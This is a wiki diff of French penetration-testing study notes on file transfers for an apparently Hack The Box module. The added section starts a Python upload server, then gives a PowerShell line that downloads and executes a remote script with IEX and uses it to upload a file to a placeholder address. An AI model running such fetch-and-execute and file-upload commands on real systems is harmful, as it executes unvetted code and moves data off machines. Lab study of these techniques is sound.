@@ -2,7 +2,7 @@
 title: File Transfers
 description: 
 published: true
-date: 2025-03-29T13:00:15.933Z
+date: 2025-03-29T13:03:44.780Z
 tags: notes, htb, module
 editor: markdown
 dateCreated: 2025-03-16T15:21:30.098Z
@@ -237,5 +237,12 @@ pip3 install uploadserver
 Démarrer le serveur web:
 ```
 python3 -m uploadserver
+```
+
+Il est ensuite possible d'utiliser les cmdlets PowerShell ou de passer par un script comme [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1):
+
+```
+IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+Invoke-FileUpload -Uri http://<adresse>:<portr>/upload -File <fichier>
 ```
 
